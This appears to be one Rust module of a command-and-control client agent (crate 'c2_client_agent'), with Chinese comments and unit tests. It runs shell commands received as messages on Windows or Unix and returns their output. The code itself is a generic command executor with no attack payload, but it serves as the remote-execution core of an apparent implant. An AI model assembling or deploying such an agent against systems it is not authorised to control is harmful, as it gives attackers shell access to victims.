// 命令执行模块
//
// 负责执行系统 shell 命令并捕获输出。
// 支持跨平台执行（Windows/Linux/MacOS）。
// Windows 使用 encoding_rs 正确解码 GBK 编码，Linux/MacOS 使用 UTF-8 编码。

use crate::types::CommandResult;
use log::{debug, error};
use tokio::process::Command;
#[cfg(target_os = "windows")]
use encoding_rs::GBK;

/// 命令执行器
/// 
/// 负责执行 shell 命令并捕获标准输出和标准错误输出。
/// 根据操作系统自动选择合适的 shell 和编码。
pub struct CommandExecutor;

impl CommandExecutor {
    /// 根据操作系统获取 shell 路径和参数
    /// 
    /// # 返回值
    /// 
    /// 返回一个元组 `(shell_path, shell_arg)`：
    /// - Windows: `("cmd.exe", "/C")`
    /// - Linux/MacOS: `("/bin/sh", "-c")`
    /// 
    /// # 示例
    /// 
    /// ```
    /// use c2_client_agent::executor::CommandExecutor;
    /// 
    /// let (shell, arg) = CommandExecutor::get_shell();
    /// 
    /// #[cfg(target_os = "windows")]
    /// assert_eq!(shell, "cmd.exe");
    /// 
    /// #[cfg(target_os = "linux")]
    /// assert_eq!(shell, "/bin/sh");
    /// ```
    pub fn get_shell() -> (&'static str, &'static str) {
        #[cfg(target_os = "windows")]
        {
            // Use /C to execute and terminate (fixes hanging issue)
            // /C executes the command and then terminates, allowing Rust to capture output
            ("cmd.exe", "/C")
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            ("/bin/sh", "-c")
        }
    }
    
    /// 执行 shell 命令
    /// 
    /// 该方法会根据操作系统选择合适的 shell，执行指定的命令，
    /// 并捕获标准输出和标准错误输出。
    /// 
    /// # 编码处理
    /// 
    /// - Windows: 使用 encoding_rs 正确解码 GBK 编码输出（修复中文乱码问题）
    /// - Linux/MacOS: 使用 UTF-8 编码
    /// 
    /// # 参数
    /// 
    /// * `command` - 要执行的命令字符串
    /// 
    /// # 返回值
    /// 
    /// 返回 `CommandResult`，包含命令的标准输出和标准错误输出。
    /// 如果命令执行失败，错误信息会被放入 `stderr` 字段。
    /// 
    /// # 示例
    /// 
    /// ```no_run
    /// use c2_client_agent::executor::CommandExecutor;
    /// 
    /// #[tokio::main]
    /// async fn main() {
    ///     let result = CommandExecutor::execute("echo hello").await;
    ///     println!("stdout: {}", result.stdout);
    ///     println!("stderr: {}", result.stderr);
    /// }
    /// ```
    pub async fn execute(command: &str) -> CommandResult {
        // 🛡️ HEARTBEAT FILTER: Prevent server heartbeats from being executed as shell commands
        // Filter out:
        // 1. Commands containing "ping" (heartbeat messages like {"type":"ping"})
        // 2. Commands starting with "{" (JSON control messages)
        // 3. Empty or whitespace-only commands
        let trimmed = command.trim();
        if trimmed.is_empty() || trimmed.contains("ping") || trimmed.starts_with("{") {
            debug!("Filtered out heartbeat/control message: {}", command);
            return CommandResult {
                stdout: String::new(),
                stderr: String::new(),
                path: None,
                req_id: None,
            };
        }
        
        let (shell, shell_arg) = Self::get_shell();
        
        let full_command = command.to_string();
        
        // 使用 tokio::process::Command 执行命令
        match Command::new(shell)
            .arg(shell_arg)
            .arg(&full_command)
            .output()
            .await
        {
            Ok(output) => {
                // ✅ NEW: Use encoding_rs to properly decode GBK output on Windows
                #[cfg(target_os = "windows")]
                let stdout = Self::decode_windows_output(&output.stdout);
                #[cfg(target_os = "windows")]
                let stderr = Self::decode_windows_output(&output.stderr);
                
                #[cfg(not(target_os = "windows"))]
                let stdout = Self::decode_output(&output.stdout);
                #[cfg(not(target_os = "windows"))]
                let stderr = Self::decode_output(&output.stderr);
                
                CommandResult { 
                    stdout, 
                    stderr,
                    path: None,
                    req_id: None, // req_id 将在 handler 中设置
                }
            }
            Err(e) => {
                // 命令执行失败，将错误信息放入 stderr
                error!("Failed to execute command: {}", e);
                
                CommandResult {
                    stdout: String::new(),
                    stderr: format!("Command execution failed: {}", e),
                    path: None,
                    req_id: None, // req_id 将在 handler 中设置
                }
            }
        }
    }
    
    /// 解码 Windows 命令输出
    /// 
    /// 使用 encoding_rs 将 GBK 编码的字节转换为 UTF-8 字符串
    /// 这是修复中文字符显示问题的关键
    #[cfg(target_os = "windows")]
    fn decode_windows_output(bytes: &[u8]) -> String {
        if let Ok(text) = std::str::from_utf8(bytes) {
            return text.to_string();
        }
        let (decoded_cow, _encoding_used, _had_errors) = GBK.decode(bytes);
        decoded_cow.to_string()
    }
    
    /// 解码命令输出
    /// 
    /// 使用 UTF-8 编码解码输出
    #[cfg(not(target_os = "windows"))]
    fn decode_output(bytes: &[u8]) -> String {
        // Linux/MacOS 使用 UTF-8 编码
        String::from_utf8_lossy(bytes).to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_shell_windows() {
        #[cfg(target_os = "windows")]
        {
            let (shell, arg) = CommandExecutor::get_shell();
            assert_eq!(shell, "cmd.exe");
            assert_eq!(arg, "/C"); // Fixed: Use /C instead of /k to prevent hanging
        }
    }

    #[test]
    fn test_get_shell_unix() {
        #[cfg(not(target_os = "windows"))]
        {
            let (shell, arg) = CommandExecutor::get_shell();
            assert_eq!(shell, "/bin/sh");
            assert_eq!(arg, "-c");
        }
    }

    #[tokio::test]
    async fn test_execute_simple_command() {
        // 测试简单的 echo 命令
        #[cfg(target_os = "windows")]
        let result = CommandExecutor::execute("echo hello").await;
        
        #[cfg(not(target_os = "windows"))]
        let result = CommandExecutor::execute("echo hello").await;
        
        // stdout 应该包含 "hello"
        assert!(result.stdout.contains("hello"));
        
        // stderr 应该为空或只包含空白字符
        assert!(result.stderr.trim().is_empty());
    }

    #[tokio::test]
    async fn test_execute_command_with_output() {
        // 测试带输出的命令
        #[cfg(target_os = "windows")]
        let result = CommandExecutor::execute("echo test output").await;
        
        #[cfg(not(target_os = "windows"))]
        let result = CommandExecutor::execute("echo test output").await;
        
        assert!(result.stdout.contains("test output"));
    }

    #[tokio::test]
    async fn test_execute_command_captures_stderr() {
        // 测试捕获 stderr
        // 在 Windows 上，使用 echo 到 stderr 的命令
        #[cfg(target_os = "windows")]
        let result = CommandExecutor::execute("echo error message 1>&2").await;
        
        // 在 Unix 上，使用 >&2 重定向到 stderr
        #[cfg(not(target_os = "windows"))]
        let result = CommandExecutor::execute("echo error message >&2").await;
        
        // stderr 应该包含错误消息
        assert!(result.stderr.contains("error message"));
    }

    #[tokio::test]
    async fn test_execute_invalid_command() {
        // 测试执行不存在的命令
        let result = CommandExecutor::execute("this_command_does_not_exist_12345").await;
        
        // 应该有错误输出（在 stderr 中）
        // Windows 和 Unix 的错误消息可能不同，但都应该有内容
        assert!(!result.stderr.is_empty());
    }

    #[tokio::test]
    async fn test_execute_multiline_output() {
        // 测试多行输出
        #[cfg(target_os = "windows")]
        let result = CommandExecutor::execute("echo line1 & echo line2").await;
        
        #[cfg(not(target_os = "windows"))]
        let result = CommandExecutor::execute("echo line1; echo line2").await;
        
        assert!(result.stdout.contains("line1"));
        assert!(result.stdout.contains("line2"));
    }

    #[tokio::test]
    async fn test_execute_empty_command() {
        // 测试空命令
        let result = CommandExecutor::execute("").await;
        
        // 空命令应该成功执行（不会崩溃）
        // stdout 和 stderr 可能为空或包含 shell 提示
        assert!(result.stdout.len() >= 0);
        assert!(result.stderr.len() >= 0);
    }

    #[tokio::test]
    async fn test_execute_command_with_special_characters() {
        // 测试包含特殊字符的命令
        #[cfg(target_os = "windows")]
        let result = CommandExecutor::execute("echo hello & echo world").await;
        
        #[cfg(not(target_os = "windows"))]
        let result = CommandExecutor::execute("echo hello && echo world").await;
        
        assert!(result.stdout.contains("hello"));
        assert!(result.stdout.contains("world"));
    }

    #[tokio::test]
    async fn test_command_result_to_response_message() {
        // 测试 CommandResult 转换为响应消息
        let result = CommandExecutor::execute("echo test").await;
        let response_msg = result.to_response_message();
        
        // 验证消息类型
        assert_eq!(response_msg.msg_type, crate::types::MessageType::Response);
        
        // 验证 payload 可以被解析
        let payload: crate::types::ResponsePayload = 
            serde_json::from_value(response_msg.payload).unwrap();
        
        assert!(payload.stdout.contains("test"));
    }

    #[tokio::test]
    async fn test_execute_never_panics() {
        // 测试各种边界情况都不会 panic
        let test_commands = vec![
            "",
            "echo test",
            "invalid_command_xyz",
            "echo hello & echo world",
        ];
        
        for cmd in test_commands {
            let result = CommandExecutor::execute(cmd).await;
            // 只要不 panic 就算通过
            assert!(result.stdout.len() >= 0);
            assert!(result.stderr.len() >= 0);
        }
    }
}
